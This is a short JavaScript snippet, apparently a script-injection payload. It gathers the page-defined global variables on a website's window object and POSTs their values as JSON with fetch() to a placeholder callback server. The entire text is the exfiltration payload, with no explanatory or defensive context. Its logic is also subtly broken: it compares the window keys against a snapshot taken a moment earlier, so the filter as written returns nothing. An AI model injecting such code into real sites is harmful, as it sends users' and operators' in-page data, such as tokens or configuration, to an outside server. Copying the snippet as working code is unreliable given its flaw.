// Capture standard objects before the page defines new ones
const standardWindowKeys = Object.keys(window);

// Now, compare the current window objects with the standard ones
const nonStandardObjects = Object.keys(window).filter(key => !standardWindowKeys.includes(key));

// Prepare key/value pairs of the non-standard objects
const nonStandardKeyValuePairs = {};

nonStandardObjects.forEach(key => {
    try {
        nonStandardKeyValuePairs[key] = window[key];  // Get the value of the non-standard object
    } catch (error) {
        nonStandardKeyValuePairs[key] = 'Cannot access value';  // Handle any access issues
    }
});

// Stringify the key/value pairs and send it via POST
fetch('https://<callbackserver>', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({ data: nonStandardKeyValuePairs })
}).then(response => response.text())
.then(result => console.log('Data posted successfully:', result))
.catch(error => console.error('Error posting data:', error));
